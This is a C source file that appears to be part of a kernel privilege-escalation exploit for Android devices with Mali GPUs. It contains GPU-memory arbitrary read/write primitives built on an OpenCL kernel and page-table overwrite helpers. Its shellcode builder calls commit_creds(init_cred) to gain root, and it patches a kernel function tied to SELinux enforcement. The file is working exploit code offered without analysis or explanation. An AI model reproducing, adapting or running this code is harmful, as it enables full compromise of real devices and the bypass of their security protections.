#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#include "stdbool.h"

#include "mem_read_write.h"
#include "mempool_utils.h"
#include "firmware_offsets.h"

#define ADRP_INIT_INDEX 0

#define ADD_INIT_INDEX 1

#define ADRP_COMMIT_INDEX 2

#define ADD_COMMIT_INDEX 3

void* map_gpu(int mali_fd, unsigned int va_pages, unsigned int commit_pages, bool read_only, int group) {
  union kbase_ioctl_mem_alloc alloc = {0};
  alloc.in.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_CPU_WR | (group << 22);
  int prot = PROT_READ;
  if (!read_only) {
    alloc.in.flags |= BASE_MEM_PROT_GPU_WR;
    prot |= PROT_WRITE;
  }
  alloc.in.va_pages = va_pages;
  alloc.in.commit_pages = commit_pages;
  mem_alloc(mali_fd, &alloc);
  void* region = mmap(NULL, 0x1000 * va_pages, prot, MAP_SHARED, mali_fd, alloc.out.gpu_va);
  if (region == MAP_FAILED) {
    err(1, "mmap failed");
  }
  return region;
}

static inline uint32_t lo32(uint64_t x) {
  return x & 0xffffffff;
}

static inline uint32_t hi32(uint64_t x) {
  return x >> 32;
}

static uint32_t write_adrp(int rd, uint64_t pc, uint64_t label) {
  uint64_t pc_page = pc >> 12;
  uint64_t label_page = label >> 12;
  int64_t offset = (label_page - pc_page) << 12;
  int64_t immhi_mask = 0xffffe0;
  int64_t immhi = offset >> 14;
  int32_t immlo = (offset >> 12) & 0x3;
  uint32_t adpr = rd & 0x1f;
  adpr |= (1 << 28);
  adpr |= (1 << 31); //op
  adpr |= immlo << 29;
  adpr |= (immhi_mask & (immhi << 5));
  return adpr;
}

void fixup_root_shell(uint64_t init_cred, uint64_t commit_cred, uint64_t read_enforce, uint32_t add_init, uint32_t add_commit, uint32_t* root_code) {

  uint32_t init_adpr = write_adrp(0, read_enforce, init_cred);
  //Sets x0 to init_cred
  root_code[ADRP_INIT_INDEX] = init_adpr;
  root_code[ADD_INIT_INDEX] = add_init;
  //Sets x8 to commit_creds
  root_code[ADRP_COMMIT_INDEX] = write_adrp(8, read_enforce, commit_cred);
  root_code[ADD_COMMIT_INDEX] = add_commit;
  root_code[4] = 0xa9bf7bfd; // stp x29, x30, [sp, #-0x10]
  root_code[5] = 0xd63f0100; // blr x8
  root_code[6] = 0xa8c17bfd; // ldp x29, x30, [sp], #0x10
  root_code[7] = 0xd65f03c0; // ret
}

static uint64_t set_addr_lv3(uint64_t addr) {
  uint64_t pfn = addr >> PAGE_SHIFT;
  pfn &= ~ 0x1FFUL;
  pfn |= 0x100UL;
  return pfn << PAGE_SHIFT;
}

static inline uint64_t compute_pt_index(uint64_t addr, int level) {
  uint64_t vpfn = addr >> PAGE_SHIFT;
  vpfn >>= (3 - level) * 9;
  return vpfn & 0x1FF;
}

struct rw_mem_kernel create_rw_mem(cl_context context, cl_device_id* device_id, bool is64) {
  int ret = 0;

  const char* source_str64 = 
  "__kernel void rw_mem(__global unsigned long *va, __global unsigned long *in_out, __global unsigned long *flag) {"
  "size_t idx = get_global_id(0);"
  "if (flag[idx]) {"
  " __global unsigned long *addr = (__global unsigned long*)(va[idx]);"
  " addr[0] = in_out[idx];"
  "} else {"
  "  __global unsigned long *addr = (__global unsigned long *)(va[idx]);"
  "	in_out[idx] = addr[0];"
  "}"
"};";

  const char* source_str32 = 
  "__kernel void rw_mem(__global unsigned long *va, __global unsigned long *in_out, __global unsigned long *flag) {"
  "size_t idx = get_global_id(0);"
  "if (flag[idx]) {"
  " __global unsigned int *addr = (__global unsigned int*)(va[idx]);"
  " addr[0] = (unsigned int)(in_out[idx]);"
  "} else {"
  "  __global unsigned int *addr = (__global unsigned int *)(va[idx]);"
  "	in_out[idx] = addr[0];"
  "}"
"};";

  const char* source_str = is64 ? source_str64 : source_str32;

  size_t source_size = strlen(source_str);

  cl_mem va = clCreateBuffer(context, CL_MEM_READ_WRITE, 
            sizeof(uint64_t), NULL, &ret);
  if (ret != CL_SUCCESS) {
    err(1, "Failed to create va buffer\n");
  }
  cl_mem in_out = clCreateBuffer(context, CL_MEM_READ_WRITE,
            sizeof(uint64_t), NULL, &ret);
  if (ret != CL_SUCCESS) {
    err(1, "Failed to create in_out buffer\n");
  }
  cl_mem flag = clCreateBuffer(context, CL_MEM_READ_WRITE, 
            sizeof(uint64_t), NULL, &ret);
  if (ret != CL_SUCCESS) {
    err(1, "Failed to create flag buffer\n");
  }

  cl_program program = clCreateProgramWithSource(context, 1, (const char**)(&source_str), (const size_t*)(&source_size), &ret);
  ret = clBuildProgram(program, 1, device_id, NULL, NULL, NULL);
  if (ret != CL_SUCCESS) {
    err(1, "Failed to create program\n");
  }

  cl_kernel kernel = clCreateKernel(program, "rw_mem", &ret);
  if (ret != CL_SUCCESS) {
    err(1, "Failed to create kernel %d\n", ret);
  }
  printf("kernel success\n");
  ret = clSetKernelArg(kernel, 0, sizeof(cl_mem), (void *)&va);
  ret = clSetKernelArg(kernel, 1, sizeof(cl_mem), (void *)&in_out);
  ret = clSetKernelArg(kernel, 2, sizeof(cl_mem), (void *)&flag);
  if (ret != CL_SUCCESS) {
    err(1, "Failed to set kernel arg\n");
  }
  struct rw_mem_kernel out = {0};
  out.va = va;
  out.in_out = in_out;
  out.flag = flag;
  out.kernel = kernel;
  out.program = program;
  return out;
}

void write_to(int mali_fd, uint64_t* gpu_addr, uint64_t* value, cl_command_queue command_queue, struct rw_mem_kernel* kernel) {
  uint64_t write = 1;
  int ret = 0;
  ret = clEnqueueWriteBuffer(command_queue, kernel->va, CL_TRUE, 0, sizeof(uint64_t), gpu_addr, 0, NULL, NULL);
  ret = clEnqueueWriteBuffer(command_queue, kernel->in_out, CL_TRUE, 0, sizeof(uint64_t), value, 0, NULL, NULL);
  ret = clEnqueueWriteBuffer(command_queue, kernel->flag, CL_TRUE, 0, sizeof(uint64_t), &write, 0, NULL, NULL);

  if (ret != CL_SUCCESS) {
    err(1, "Failed to write to buffer\n");
  }

  size_t global_work_size = 1;
  size_t local_work_size = 1;
  ret = clEnqueueNDRangeKernel(command_queue, kernel->kernel, 1, NULL, &global_work_size, &local_work_size, 0, NULL, NULL);
  if (ret != CL_SUCCESS) {
    err(1, "Failed to enqueue kernel\n");
  }
  if (clFlush(command_queue) != CL_SUCCESS) {
    err(1, "Falied to flush queue in write_to\n");
  }
  usleep(10000);
}


void write_func(int mali_fd, uint64_t func, uint64_t* reserved, uint64_t size, uint32_t* shellcode, uint64_t code_size, uint64_t reserved_size, cl_command_queue command_queue, struct rw_mem_kernel* kernel32) {
  uint64_t func_offset = (func + KERNEL_BASE) % 0x1000;
  uint64_t curr_overwrite_addr = 0;
  for (int i = 0; i < size; i++) {
    uint64_t base = reserved[i];
    uint64_t end = reserved[i] + reserved_size * 0x1000;
    uint64_t start_idx = compute_pt_index(base, 3);
    uint64_t end_idx = compute_pt_index(end, 3);
    for (uint64_t addr = base; addr < end; addr += 0x1000) {
      uint64_t overwrite_addr = set_addr_lv3(addr);
      if (curr_overwrite_addr != overwrite_addr) {
        LOG("overwrite addr : %lx %lx\n", overwrite_addr + func_offset, func_offset);
        curr_overwrite_addr = overwrite_addr;
        for (int code = code_size - 1; code >= 0; code--) {
          uint64_t this_addr = overwrite_addr + func_offset + code * 4;
          uint64_t this_code = shellcode[code];
          write_to(mali_fd, &this_addr, &this_code, command_queue, kernel32);
        }
        usleep(300000);
      }
    }
  }
}

uint64_t read_from(int mali_fd, uint64_t* gpu_addr, cl_command_queue command_queue, struct rw_mem_kernel* kernel) {
  uint64_t read = 0;
  int ret = 0;
  ret = clEnqueueWriteBuffer(command_queue, kernel->va, CL_TRUE, 0, sizeof(uint64_t), gpu_addr, 0, NULL, NULL);
  ret = clEnqueueWriteBuffer(command_queue, kernel->flag, CL_TRUE, 0, sizeof(uint64_t), &read, 0, NULL, NULL);

  if (ret != CL_SUCCESS) {
    err(1, "Failed to write to buffer\n");
  }

  size_t global_work_size = 1;
  size_t local_work_size = 1;
  ret = clEnqueueNDRangeKernel(command_queue, kernel->kernel, 1, NULL, &global_work_size, &local_work_size, 0, NULL, NULL);
  if (ret != CL_SUCCESS) {
    err(1, "Failed to enqueue kernel\n");
  }
  uint64_t out = 0;
  if (clEnqueueReadBuffer(command_queue, kernel->in_out, CL_TRUE, 0, sizeof(uint64_t), &out, 0, NULL, NULL) != CL_SUCCESS) {
    err(1, "Failed to read result\n");
  }
  if (clFlush(command_queue) != CL_SUCCESS) {
    err(1, "Falied to flush queue in write_to\n");
  }
  usleep(10000);
  return out;
}

void releaseKernel(struct rw_mem_kernel* kernel) {
  clReleaseKernel(kernel->kernel);
  clReleaseProgram(kernel->program);
  clReleaseMemObject(kernel->va);
  clReleaseMemObject(kernel->in_out);
  clReleaseMemObject(kernel->flag);
  memset(kernel, 0, sizeof(struct rw_mem_kernel));
}

void cleanup(int mali_fd, uint64_t pgd, cl_command_queue command_queue, struct rw_mem_kernel* kernel) {
  uint64_t addr = pgd + OVERWRITE_INDEX * sizeof(uint64_t);
  uint64_t invalid = 2;
  write_to(mali_fd, &addr, &invalid, command_queue, kernel);
}

int run_enforce() {
  char result = '2';
  sleep(3);
  int enforce_fd = open("/sys/fs/selinux/enforce", O_RDONLY);
  read(enforce_fd, &result, 1);
  close(enforce_fd);
  LOG("result %d\n", result);
  return result;
}
